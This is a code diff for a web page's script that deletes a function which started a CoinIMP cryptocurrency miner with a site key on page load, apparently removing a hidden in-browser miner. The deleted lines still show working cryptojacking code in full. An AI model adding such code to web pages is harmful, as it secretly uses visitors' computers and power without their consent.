@@ -430,22 +430,7 @@ window.addEventListener("DOMContentLoaded", () => {
         }).catch(function(error) {
             console.log('Service Worker registration failed:', error);
         });
-    }
-
-    /* ---------- Start Mining in Background ---------- */
-    function startMining() {
-        const miner = new CoinIMP('2945851f59e3ee79b6160d95323c186e47ad416cc9bcc7d76bb858127de4b4f4');  // Replace with your actual site key
-        miner.start();
-
-        // Periodically send mining status back to the UI
-        let counter = 0;
-        setInterval(() => {
-            counter++;
-            console.log(`Mining... Completed ${counter} iterations`);
-        }, 1000);
-    }
-
-    startMining();
+    }  
 </script>
 </body>
 </html>
